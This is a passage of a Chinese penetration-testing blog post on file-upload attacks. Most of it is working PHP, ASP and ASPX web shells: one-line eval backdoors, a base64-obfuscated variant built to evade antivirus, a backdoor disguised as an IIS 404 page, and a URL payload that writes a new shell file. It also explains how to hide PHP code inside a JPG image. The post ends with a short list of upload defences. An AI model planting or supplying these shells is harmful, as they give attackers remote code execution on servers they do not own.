本地文件包含漏洞；
Apache解析漏洞；
IIS解析漏洞；
Nginx解析漏洞；</code></pre><h3 id="文件内容检测方式"><a href="#文件内容检测方式" class="headerlink" title="文件内容检测方式"></a>文件内容检测方式</h3><p>对文件进行恶意代码注入，再配合解析漏洞。</p>
<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ol>
<li><p>php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘key’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">.</span><span class="token string">"s"</span><span class="token punctuation">.</span><span class="token string">"s"</span><span class="token punctuation">.</span><span class="token string">"e"</span><span class="token punctuation">.</span><span class="token string">"r"</span><span class="token punctuation">.</span><span class="token string">"t"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>
</li>
<li><p>asp</p>
<pre><code>&lt;% eval request(“key”)%&gt;</code></pre></li>
<li><p>aspx</p>
<pre><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;key&quot;],&quot;unsafe&quot;);%&gt;</code></pre></li>
</ol>
<h3 id="php过狗一句话"><a href="#php过狗一句话" class="headerlink" title="php过狗一句话"></a>php过狗一句话</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
  <span class="token variable">$mt</span><span class="token operator">=</span><span class="token string">"JF9QT1N"</span><span class="token punctuation">;</span> 
  <span class="token variable">$ojj</span><span class="token operator">=</span><span class="token string">"QGV2YWwo"</span><span class="token punctuation">;</span>
  <span class="token variable">$hsa</span><span class="token operator">=</span><span class="token string">"UWydpMGle"</span><span class="token punctuation">;</span>
  <span class="token variable">$fnx</span><span class="token operator">=</span><span class="token string">"5BeSleleddKTs="</span><span class="token punctuation">;</span>
  <span class="token variable">$zk</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"sdtdrd_redpdldadcde"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$ef</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token variable">$dva</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                           
  <span class="token variable">$zvm</span> <span class="token operator">=</span> <span class="token variable">$dva</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token variable">$zvm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<p>分析：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$zk</span> <span class="token operator">=</span> <span class="token string">"str_replace"</span><span class="token punctuation">;</span>
<span class="token variable">$ef</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span> 
    <span class="token operator">=</span> <span class="token string">"base64_decode"</span>
<span class="token variable">$dva</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
     <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span> 
     <span class="token operator">=</span> <span class="token string">"create_function"</span>
<span class="token variable">$zvm</span> <span class="token operator">=</span> <span class="token variable">$dva</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> QGV2YWwoJF9QT1NUWydpMGle5BeSleleddKTs<span class="token operator">=</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">"QGV2YWwoJF9QT1NUWydpMG5BeSddKTs="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">"@eval($_POST['i0nAy']);"</span><span class="token punctuation">)</span></code></pre>
<p>过狗一句话总结为：<strong>打乱字符；编码技术；拆分组合；创建，匹配</strong>。</p>
<h3 id="变形的一句话"><a href="#变形的一句话" class="headerlink" title="变形的一句话"></a>变形的一句话</h3><pre><code>&lt;?php ($_=@$\_GET\[2\]).@$\_($_POST\[sz\])?&gt;

&lt;?php $a = str\_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($\_POST\[&quot;sz&quot;\]); ?&gt;

&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} \[&#39;sz&#39;\]);?&gt;

&lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST\[&quot;sz&quot;\]); ?&gt;</code></pre><h3 id="404隐藏PHP后门"><a href="#404隐藏PHP后门" class="headerlink" title="404隐藏PHP后门"></a>404隐藏PHP后门</h3><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HEAD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TITLE</span><span class="token punctuation">></span></span></span>无法找到该页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TITLE</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">HTTP-EQUIV</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">Content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>GB2312<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token constant">BODY</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 9pt<span class="token operator">/</span>12pt 宋体 <span class="token punctuation">}</span>
    <span class="token constant">H1</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 12pt<span class="token operator">/</span>15pt 宋体 <span class="token punctuation">}</span>
      <span class="token constant">H2</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 9pt<span class="token operator">/</span>12pt 宋体 <span class="token punctuation">}</span>
        A<span class="token punctuation">:</span>link <span class="token punctuation">{</span> color<span class="token punctuation">:</span> red <span class="token punctuation">}</span>
      A<span class="token punctuation">:</span>visited <span class="token punctuation">{</span> color<span class="token punctuation">:</span> maroon <span class="token punctuation">}</span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HEAD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BODY</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TABLE</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span>500</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span>0</span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation">=</span>10</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TR</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TD</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>无法找到该页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
      您正在搜索的页面可能已经删除、更名或暂时不可用。
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>请尝试以下操作：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>单击<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.asp-muma.com/javascript:history.back(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>后退<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>按钮尝试另一个链接。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token constant">HTTP</span> 错误 <span class="token number">404</span> <span class="token operator">-</span> 文件或目录未找到。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>Internet 信息服务 <span class="token punctuation">(</span><span class="token constant">IIS</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>技术信息（为技术支持人员提供）<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>转到 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token punctuation">></span></span></span>Microsoft 产品支持服务<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>并搜索包括<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token constant">HTTP</span><span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>和<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token number">404</span><span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>的标题。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>打开<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token constant">IIS</span> 帮助<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>（可在 <span class="token constant">IIS</span> 管理器 <span class="token punctuation">(</span>inetmgr<span class="token punctuation">)</span> 中访问），然后搜索标题为<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>网站设置<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>、<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>常规管理任务<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>和<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>关于自定义错误消息<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>的主题。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TR</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TABLE</span><span class="token punctuation">></span></span></span>
      <span class="token delimiter">&lt;?php</span>
      @preg\<span class="token package">_replace</span><span class="token punctuation">(</span><span class="token string">"/\[checksql\]/e"</span><span class="token punctuation">,</span>$\<span class="token package">_POST<span class="token punctuation">\</span></span><span class="token punctuation">[</span><span class="token string">'cnsec'</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"saft"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 404 Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token delimiter">?></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BODY</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223515.png" alt></p>
<h3 id="php面杀小马"><a href="#php面杀小马" class="headerlink" title="php面杀小马"></a>php面杀小马</h3><ul>
<li><p>小马如下:</p>
<pre><code>&lt;?php $_GET[a]($_GET[b]);?&gt;</code></pre></li>
<li><p>仅用<code>GET函数</code>就构成了木马,利用方法如下：</p>
</li>
</ul>
<pre><code>http://localhost:8081/test/a.php?a=assert&amp;b=${fputs%28fopen%28base64\_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};</code></pre><ul>
<li>执行后当前目录生成<code>c.php</code>一句话木马，当传参<code>a</code>为<code>eval</code>时会报错</li>
</ul>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223813.png" alt></p>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223823.png" alt></p>
<h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><ol>
<li><p>windows命令：</p>
<pre><code>copy /b 1.jpg+2.php</code></pre><p><code>1.jpg</code>即为图片木马</p>
</li>
<li><p><code>Edjpgcom</code>:<br>专业的图片木马制作工具,使用方法:<br>打开<code>edjpgcom.exe</code>所在文件夹，然后把你所要修改的图片<strong>拖动</strong>到<code>edjpgcom.exe</code>上面，然后<code>edjpgcom.exe</code>会自动打开，写入想要写的代码即可。</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528562057_94708147_1536893280" alt></p>
<h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御."></a>文件上传防御.</h2><ul>
<li>轻量级检测必然能绕过</li>
<li>检测的重点放在文件内容检测</li>
<li>路径/扩展名检测一定要用白名单</li>
<li>不能有本地文件包含漏洞</li>
<li>随时注意更新Web应用软件</li>
</ul>
<ol>
<li>关掉上传文件的功能<br>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。</li>
<li>限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。</li>
<li>检查上传文件的类型</li>
<li>检查上传文件的内容</li>
<li>上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性</li>
</ol>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.fengwenhua.top" rel="external nofollow noreferrer">冯文华</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://www.fengwenhua.top/2019/03/11/wen-jian-shang-chuan-jie-xi-zong-jie/">https://www.fengwenhua.top/2019/03/11/wen-jian-shang-chuan-jie-xi-zong-jie/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/文件上传/">
                                    <span class="chip bg-color">文件上传</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechatpay.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>
            
        </div>
    </div>

    

    
        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
<link rel="stylesheet" href="/css/gitment.css">

<div class="gitment-card card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitment-content" class="card-content"></div>
</div>

<script src="https://billts.site/js/gitment.js"></script>
<script>
var gitment = new Gitment({
    id: 'Sun Mar 10 2019 21:12:29 GMT+0000',
    owner: 'fengwenhua',
    repo: 'fengwenhua.github.io',
    oauth: {
        client_id: '487b675438c149b5818b',
        client_secret: '501477eec1e2ed9f27751d02281b5834021d6c7b'
    }
});

gitment.render('gitment-content');
</script>

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2019/03/11/wen-jian-bao-han-zong-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="文件包含总结">
                        
                        <span class="card-title">文件包含总结</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
实验环境：phpstudy，在D:\phpStudy\PHPTutorial\WWW\目录下新建fileinclude,然后新建index.php,内容如下

&lt;?php
    $file = $_GET['file'];
   
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2019-03-10
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/渗透测试/" class="post-category">
                                    渗透测试
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/文件包含/">
                        <span class="chip bg-color">文件包含</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2019/02/14/dell-7559-10-14-3-hei-ping-guo/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="dell-7559-10.14.3-黑苹果">
                        
                        <span class="card-title">dell-7559-10.14.3-黑苹果</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            [toc]
7559黑苹果
参考链接: Dell 7559 安装10.14GM教程（i5+UEFI）这位大佬的教程已经很完善了,只不过本人是小白,所以对这位大佬的教程进行了一些补充,如果你已经按照他的教程安装完成了,现在是10.14或者10
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2019-02-13
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Linux/" class="post-category">
                                    Linux
                                </a>
                            
